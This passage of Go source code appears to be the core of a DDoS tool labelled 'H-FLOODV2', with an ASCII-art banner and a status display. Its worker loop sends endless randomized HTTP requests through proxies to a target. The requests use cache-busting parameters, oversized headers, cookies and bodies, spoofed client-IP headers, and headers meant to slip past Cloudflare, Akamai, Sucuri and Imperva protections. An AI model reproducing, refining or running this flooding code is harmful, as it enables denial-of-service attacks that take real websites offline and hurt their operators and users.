			IdleConnTimeout:        KEP,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 4 * time.Second,
			ExpectContinueTimeout: 0 * time.Second,
		}
		ip := ""
		if ProxyY != nil {
			tr.Proxy = http.ProxyURL(ProxyY)
			ip = ProxyY.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		wcs[i] = CLI{client: &http.Client{Transport: tr, Timeout: to, Jar: jar}, ip: ip}
	}

	fmt.Printf("%s", WhiteBright)
	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
	fmt.Printf("%s", LightPink)
	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
	fmt.Printf("%s", RedPink)
	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
	fmt.Printf("%s", RedLight)
	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
	fmt.Printf("%s", Red)
	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
	fmt.Printf("%s", RedBright)
	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
	fmt.Printf("%s", Reset)
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", Red, Reset)

	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
				Green, Reset, White, label, Reset, Red, Reset, White, value, Reset, Red, Green, status, Red)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n", Green, Reset, White, label, Reset, Red, Reset, White, value, Reset)
		}
	}
	printInfo("Author", "Diz Flyze Ofc              ", "True")
	printInfo("Target", host, "")
	printInfo("Port  ", "443                        ", "True")
	printInfo("Method", "H-FLOODV2                  ", "True")
	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(PRX)), "True")
	printInfo("Worker", fmt.Sprintf("%d                       ", Speed), "True")
	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", httpVersion), "True")
	printInfo("CDN   ", fmt.Sprintf("%-24s   ", protection.CDN), "True")
	if CCK != "" {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			Green, Reset, White, Reset, Red, Reset, Red, Green, "True", Red)
	} else {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			Green, Reset, White, Reset, Red, Reset, White, Red, "None", White)
	}
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", Red, Reset)

	Start_Main := time.Now()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%*s\r", 80, "")
				return
			case <-ticker.C:
				elapsed := int(time.Since(Start_Main).Seconds())
				if elapsed > dur && dur > 0 {
					elapsed = dur
				}
				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
					Green, Reset, White, Reset, Red, Reset, White, elapsed, dur, Reset, Red, Green, "True", Red)
			}
		}
	}()
	var wg sync.WaitGroup
	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() { cancel() })
	}

	for i := 0; i < Speed; i++ {
		wg.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI, workerID int) {
			defer wg.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
			for ctx.Err() == nil {
				method := VMET[rng.Intn(len(VMET))]
				ua := VUAS[rng.Intn(len(VUAS))]
				ref := VREF[rng.Intn(len(VREF))]
				enc := VENC[rng.Intn(len(VENC))]
				cacheCtrl := VCAC[rng.Intn(len(VCAC))]
				forwardIP := VIPS[rng.Intn(len(VIPS))]
				selectedOrigin := VORI[rng.Intn(len(VORI))]
				originProf := GetProfileForOrigin(selectedOrigin, host)
				prof := PFS[rng.Intn(len(PFS))]

				Target := tgt
				param := CBP[rng.Intn(len(CBP))]
				if strings.Contains(Target, "?") {
					Target += "&" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
				} else {
					Target += "?" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
				}
				if MaxP > 0 && rng.Intn(3) != 0 {
					size := MaxP * (80 + rng.Intn(40)) / 100
					if size < 1 {
						size = 1
					}
					Target += "&big=" + strings.Repeat("x", size)
				}
				if rng.Intn(10) == 0 {
					Target += "&" + RST(rng, 8) + "=" + RST(rng, 12)
				}

				var req *http.Request
				var body io.Reader
				if method == "POST" {
					body = strings.NewReader("")
				} else {
					body = nil
				}
				req, _ = http.NewRequest(method, Target, body)
				if method == "POST" {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
				if rng.Intn(3) == 0 {
					req.Host = host
				}

				req.Header.Set("User-Agent", ua)
				req.Header.Set("Accept-Encoding", enc)
				req.Header.Set("Cache-Control", cacheCtrl)
				if originProf.Origin != "" && originProf.Referer != "" {
					req.Header.Set("Referer", originProf.Referer)
				} else if ref != "" {
					req.Header.Set("Referer", ref)
				}
				if originProf.Origin != "" {
					req.Header.Set("Origin", originProf.Origin)
				}
				req.Header.Set("Sec-Fetch-Site", originProf.SecFetchSite)
				req.Header.Set("Accept", prof.Accept)
				req.Header.Set("Accept-Language", prof.Lang)
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Pragma", "no-cache")
				req.Header.Set("Upgrade-Insecure-Requests", "1")
				req.Header.Set("If-Modified-Since", ifModifiedSince)
				req.Header.Set("X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16))
				if prof.SecChUa != "" {
					req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
					req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
					req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
				}
				req.Header.Set("Sec-Fetch-Mode", prof.SecFetchMode)
				req.Header.Set("Sec-Fetch-Dest", prof.SecFetchDest)
				if prof.DNT != "" {
					req.Header.Set("DNT", prof.DNT)
				}

				if rng.Intn(3) == 0 {
					req.Header.Set("TE", "trailers")
				}
				if rng.Intn(4) == 0 {
					req.Header.Set("A-IM", "Feed")
				}
				if rng.Intn(4) == 0 {
					req.Header.Set("Delta-Base", "12340001")
				}
				if rng.Intn(3) == 0 {
					req.Header.Set("dnt", "1")
				}
				if rng.Intn(4) == 0 {
					req.Header.Set("Access-Control-Request-Method", "GET")
				}
				if rng.Intn(5) == 0 {
					req.Header.Set("source-ip", RST(rng, 5))
				}
				if rng.Intn(4) == 0 {
					req.Header.Set("Data-Return", "false")
				}

				bypassList := []string{}
				for h, ok := range Supported {
					if ok {
						bypassList = append(bypassList, h)
					}
				}
				if len(bypassList) > 0 && rng.Intn(2) == 0 {
					num := 1 + rng.Intn(min(3, len(bypassList)))
					selected := make(map[string]bool)
					for len(selected) < num {
						h := bypassList[rng.Intn(len(bypassList))]
						selected[h] = true
					}
					for h := range selected {
						switch h {
						case "X-Original-URL", "X-Rewrite-URL":
							req.Header.Set(h, "/"+RST(rng, 8))
						case "X-Forwarded-Host", "X-Proxy-Host", "X-Host", "X-Original-Host", "X-Host-Override":
							req.Header.Set(h, host)
						case "X-Request-ID":
							req.Header.Set(h, strconv.FormatInt(rng.Int63(), 16))
						case "CDN-Loop":
							req.Header.Set(h, "cloudflare")
						case "CF-Connecting-IP", "True-Client-IP", "X-Real-IP", "X-Originating-IP", "X-Client-IP", "Fastly-Client-IP":
							req.Header.Set(h, cli.ip)
						case "X-Forwarded-Proto", "X-Forwarded-Scheme", "CloudFront-Forwarded-Proto":
							req.Header.Set(h, "https")
						case "X-Cache":
							req.Header.Set(h, "BYPASS")
						case "X-Requested-With":
							req.Header.Set(h, "XMLHttpRequest")
						case "X-HTTP-Method-Override", "X-Method-Override":
							req.Header.Set(h, "GET")
						case "X-Sucuri-ID":
							req.Header.Set(h, "sucuri-"+RST(rng, 8))
						case "X-Akamai-Transformed":
							req.Header.Set(h, "1")
						case "X-CDN":
							req.Header.Set(h, "Imperva")
						default:
							req.Header.Set(h, "test")
						}
					}
				}

				if MaxHeaderCount > 0 && rng.Intn(2) == 0 {
					count := MaxHeaderCount * (80 + rng.Intn(40)) / 100
					if count < 0 {
						count = 0
					}
					for j := 0; j < count; j++ {
						req.Header.Set(fmt.Sprintf("X-Ex-%d", j), "v")
					}
				}
				if MaxHead > 0 && rng.Intn(2) == 0 {
					size := MaxHead * (80 + rng.Intn(40)) / 100
					if size < 1 {
						size = 1
					}
					req.Header.Set("X-Large-Data", strings.Repeat("x", size))
				}

				cookieParts := []string{}
				if CCK != "" {
					cookieParts = append(cookieParts, CCK)
				}
				if MaxCookieSize > 0 && rng.Intn(3) == 0 {
					size := MaxCookieSize * (80 + rng.Intn(40)) / 100
					if size < 1 {
						size = 1
					}
					cookieParts = append(cookieParts, "a="+strings.Repeat("A", size))
				}
				for _, name := range COOKIES {
					if rng.Intn(2) == 0 {
						cookieParts = append(cookieParts, name+"="+strconv.FormatInt(rng.Int63(), 16))
					}
				}
				if len(cookieParts) > 0 {
					req.Header.Set("Cookie", strings.Join(cookieParts, "; "))
				}

				if method == "POST" && MaxBodySize > 0 && rng.Intn(2) == 0 {
					size := MaxBodySize * (80 + rng.Intn(40)) / 100
					if size < 1 {
						size = 1
					}
					req.Body = io.NopCloser(strings.NewReader(strings.Repeat("B", size)))
				}

				pid := cli.ip
				if pid == "" {
					pid = forwardIP
				}
				req.Header.Set("X-Forwarded-For", pid)
				req.Header.Set("X-Real-IP", pid)

				extraHeaders := map[string][]string{
					"Accept-Charset":    {"utf-8", "iso-8859-1", "utf-8;q=0.7,*;q=0.3"},
					"Accept-Datetime":   {time.Now().Format(time.RFC1123)},
					"From":              {"user" + RST(rng, 6) + "@example.com"},
					"Max-Forwards":      {strconv.Itoa(rng.Intn(10))},
					"Pragma":            {"no-cache", "no-store"},
					"Range":             {"bytes=0-" + strconv.Itoa(rng.Intn(1000))},
					"TE":                {"trailers", "gzip", "deflate"},
					"Trailer":           {"X-Test"},
					"Upgrade":           {"h2", "websocket"},
					"X-Forwarded-Proto": {"https", "http"},
					"X-Forwarded-Host":  {host},
				}
				numExtra := rng.Intn(5) + 1
				picked := make(map[string]bool)
				for len(picked) < numExtra {
					keys := make([]string, 0, len(extraHeaders))
					for k := range extraHeaders {
						keys = append(keys, k)
					}
					h := keys[rng.Intn(len(keys))]
					picked[h] = true
				}
				for h := range picked {
					vals := extraHeaders[h]
					req.Header.Set(h, vals[rng.Intn(len(vals))])
				}
				keys := make([]string, 0, len(req.Header))
				for k := range req.Header {
					keys = append(keys, k)
				}
				rng.Shuffle(len(keys), func(i, j int) { keys[i], keys[j] = keys[j], keys[i] })
				newHeader := http.Header{}
				for _, k := range keys {
					newHeader[k] = req.Header[k]
				}
				req.Header = newHeader

				resp, err := cli.client.Do(req)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			}
		}(c, i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
	fmt.Println()
}
